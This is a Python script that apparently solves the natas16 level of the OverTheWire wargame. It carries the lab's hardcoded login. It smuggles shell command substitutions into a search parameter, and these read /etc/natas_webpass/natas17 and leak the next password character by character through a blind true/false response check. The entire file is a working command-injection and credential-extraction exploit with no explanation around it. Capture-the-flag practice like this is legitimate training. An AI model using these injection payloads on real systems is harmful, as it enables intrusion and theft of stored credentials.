import requests
import string

url = "http://natas16.natas.labs.overthewire.org/"
auth = ("natas16", "Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb")

charset = string.ascii_letters + string.digits
found = ""

for position in range(32):
    for ch in charset:
        guess = found + ch
        cmd = (
            "$(pass=$(cat /etc/natas_webpass/natas17)\n"
            f"s=${{pass#{guess}}}\n"
            "d=$(( ${#pass} - ${#s} ))\n"
            f"if [ $d = {len(guess)} ]\n"
            "then echo the\n"
            "else echo zzzznomatch\n"
            "fi)"
        )
        r = requests.get(url, auth=auth, params={"needle": cmd, "submit": "Search"})
        if "aesthetic" in r.text:   # only appears when pattern became "the"
            found += ch
            print(f"Position {position+1}: {found}")
            break
    else:
        print("No match found at position", position + 1, "- stopping")
        break

print("Final password:", found)